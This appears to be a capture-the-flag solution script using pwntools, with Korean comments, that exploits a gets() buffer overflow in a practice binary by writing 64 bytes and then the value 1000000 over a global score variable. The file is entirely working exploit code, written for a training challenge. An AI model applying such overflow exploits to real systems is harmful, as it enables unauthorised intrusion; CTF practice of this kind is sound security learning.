from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

r = remote("ctf.j0n9hyun.xyz", 3012)

# poet, author score가 전역변수로 설정되어 있었다.
# poet과 author 모두 gets로 받아 bof취약점이 있었고
# author는 64byte만큼 할당 되어있었고
# 바로 뒤에 score가 있어서 조건에 따라 1000000으로 덮어 주었다.
print(r.recv().decode('utf-8'))
r.sendline()
print(r.recv().decode('utf-8'))
r.sendline(b"A"*64+p32(1000000))
r.interactive()